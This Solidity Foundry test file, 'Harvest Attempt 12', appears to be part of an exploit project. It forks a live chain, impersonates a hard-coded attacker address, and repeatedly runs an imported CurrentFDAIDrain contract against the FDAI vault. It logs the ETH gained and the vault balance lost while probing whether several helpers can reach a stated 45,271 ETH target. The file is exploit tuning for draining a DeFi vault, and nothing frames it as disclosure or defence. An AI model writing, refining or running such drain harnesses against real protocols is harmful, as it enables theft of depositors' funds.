// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "../exploit/Run.s.sol";

/// @title Harvest Attempt 12
/// @notice Simulates sequential fresh CurrentFDAIDrain helpers on the live head.
/// @dev Hypothesis: while a single fresh helper is not enough after real gas, a short sequence of
///      fresh helpers may still clear the requested 45,271 ETH target on the current fork head.
contract Attempt12 is Test, HarvestConfig {
    address payable internal constant ATTACKER = payable(0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14);

    function setUp() public {
        vm.createSelectFork("ch2");
    }

    function test_probe_sequential_current_fdai_helpers() public {
        uint256 helperCount = vm.envOr("HARVEST_TEST_HELPERS", uint256(1));
        uint256 maxRepeats = vm.envOr("HARVEST_TEST_MAX_REPEATS", uint256(100));

        uint256 snapshot = vm.snapshotState();
        uint256 nativeBefore = ATTACKER.balance;
        uint256 vaultBefore = FDAI_VAULT.underlyingBalanceWithInvestment();
        uint256 ppfsBefore = FDAI_VAULT.getPricePerFullShare();

        console.log("SEQ_NATIVE_BEFORE:", nativeBefore);
        console.log("SEQ_VAULT_BEFORE:", vaultBefore);
        console.log("SEQ_PPFS_BEFORE:", ppfsBefore);
        console.log("SEQ_HELPERS:", helperCount);
        console.log("SEQ_MAX_REPEATS:", maxRepeats);

        for (uint256 helperIndex; helperIndex < helperCount; ++helperIndex) {
            _probeFreshHelper(helperIndex + 1, maxRepeats);
        }

        uint256 nativeAfter = ATTACKER.balance;
        uint256 vaultAfter = FDAI_VAULT.underlyingBalanceWithInvestment();
        uint256 ppfsAfter = FDAI_VAULT.getPricePerFullShare();

        console.log("SEQ_NATIVE_AFTER:", nativeAfter);
        console.log("SEQ_NATIVE_DELTA_TOTAL:", nativeAfter - nativeBefore);
        console.log("SEQ_VAULT_AFTER:", vaultAfter);
        console.log("SEQ_VAULT_DELTA_TOTAL:", vaultBefore - vaultAfter);
        console.log("SEQ_PPFS_AFTER:", ppfsAfter);

        bool reverted = vm.revertToState(snapshot);
        require(reverted, "snapshot restore failed");
    }

    function _probeFreshHelper(uint256 helperIndex, uint256 maxRepeats) internal {
        uint256 nativeBeforeHelper = ATTACKER.balance;
        uint256 vaultBeforeHelper = FDAI_VAULT.underlyingBalanceWithInvestment();
        uint256 ppfsBeforeHelper = FDAI_VAULT.getPricePerFullShare();

        uint256 deployGasBefore = gasleft();
        vm.startPrank(ATTACKER);
        CurrentFDAIDrain drain = new CurrentFDAIDrain();
        vm.stopPrank();
        uint256 deployGasUsed = deployGasBefore - gasleft();

        console.log("HELPER_INDEX:", helperIndex);
        console.log("HELPER_ADDRESS:", address(drain));
        console.log("HELPER_DEPLOY_GAS:", deployGasUsed);
        console.log("HELPER_NATIVE_BEFORE:", nativeBeforeHelper);
        console.log("HELPER_VAULT_BEFORE:", vaultBeforeHelper);
        console.log("HELPER_PPFS_BEFORE:", ppfsBeforeHelper);

        uint256 successfulRepeats;
        for (uint256 repeatIndex; repeatIndex < maxRepeats; ++repeatIndex) {
            uint256 previousNative = ATTACKER.balance;
            uint256 previousVault = FDAI_VAULT.underlyingBalanceWithInvestment();
            uint256 previousPpfs = FDAI_VAULT.getPricePerFullShare();

            uint256 executeGasBefore = gasleft();
            vm.startPrank(ATTACKER);
            try drain.execute(1) {
                vm.stopPrank();
            } catch (bytes memory reason) {
                vm.stopPrank();
                console.log("HELPER_REVERT_AT:", repeatIndex + 1);
                console.log("HELPER_REVERT_REASON:", _decodeRevert(reason));
                break;
            }
            uint256 executeGasUsed = executeGasBefore - gasleft();

            uint256 currentNative = ATTACKER.balance;
            uint256 currentVault = FDAI_VAULT.underlyingBalanceWithInvestment();
            uint256 currentPpfs = FDAI_VAULT.getPricePerFullShare();
            uint256 nativeDelta = currentNative - previousNative;
            uint256 vaultDelta = previousVault - currentVault;

            console.log("HELPER_REPEAT_INDEX:", repeatIndex + 1);
            console.log("HELPER_REPEAT_GAS:", executeGasUsed);
            console.log("HELPER_REPEAT_NATIVE_DELTA:", nativeDelta);
            console.log("HELPER_REPEAT_VAULT_DELTA:", vaultDelta);
            console.log("HELPER_REPEAT_PPFS_BEFORE:", previousPpfs);
            console.log("HELPER_REPEAT_PPFS_AFTER:", currentPpfs);

            if (currentNative <= previousNative || currentVault >= previousVault) {
                console.log("HELPER_STOP_AT:", repeatIndex + 1);
                break;
            }

            successfulRepeats = repeatIndex + 1;
        }

        console.log("HELPER_SUCCESSFUL_REPEATS:", successfulRepeats);
        console.log("HELPER_NATIVE_AFTER:", ATTACKER.balance);
        console.log("HELPER_NATIVE_DELTA_TOTAL:", ATTACKER.balance - nativeBeforeHelper);
        console.log("HELPER_VAULT_AFTER:", FDAI_VAULT.underlyingBalanceWithInvestment());
        console.log("HELPER_VAULT_DELTA_TOTAL:", vaultBeforeHelper - FDAI_VAULT.underlyingBalanceWithInvestment());
        console.log("HELPER_PPFS_AFTER:", FDAI_VAULT.getPricePerFullShare());
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "empty revert data";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 0x20))
        }

        if (selector == bytes4(keccak256("Error(string)"))) {
            bytes memory payload = new bytes(revertData.length - 4);
            for (uint256 i; i < payload.length; ++i) {
                payload[i] = revertData[i + 4];
            }
            return abi.decode(payload, (string));
        }

        if (selector == bytes4(keccak256("Panic(uint256)"))) {
            return "panic(uint256)";
        }

        return "non-standard revert";
    }
}
